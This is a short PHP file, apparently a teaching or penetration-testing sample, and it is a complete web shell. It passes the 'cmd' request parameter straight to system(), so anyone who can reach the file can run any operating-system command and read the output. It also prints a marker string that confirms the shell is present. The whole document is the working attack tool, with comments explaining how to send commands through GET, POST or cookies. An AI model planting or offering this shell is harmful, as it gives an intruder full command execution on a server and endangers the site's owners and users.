<pre>
<?php
  // The system() function passed the content of
  // the request parameter "cmd" to the operating 
  // system and prints the output

  // The $_REQUEST array combines $_GET, $_POST and $_COOKIE.
  // You can pass values as GET/POST parameters or cookie values

  // The pre tags are not required, but added for 
  // readability...
  echo "/*i_am_on_the_guestlist*/";
  system($_REQUEST['cmd']);
?>
</pre>

